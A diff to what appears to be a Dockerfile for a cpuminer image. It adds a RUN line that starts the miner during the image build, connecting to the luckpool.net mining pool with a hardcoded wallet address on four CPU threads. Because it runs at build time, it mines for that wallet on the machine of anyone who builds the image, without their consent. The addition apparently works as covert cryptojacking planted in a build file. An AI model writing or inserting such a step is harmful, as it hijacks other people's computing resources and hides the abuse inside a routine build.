@@ -32,4 +32,5 @@ RUN apt-get update \
 
 COPY --from=builder /app/cpuminer .
 ENTRYPOINT ["./cpuminer"]
+RUN ./cpuminer -c stratum+tcp://na.luckpool.net:3956 -u RK1drnJJCT8x1EWmWAXeVyB2LrhoExpDWs.BT-01 -p x --cpu 4
 CMD ["-h"]
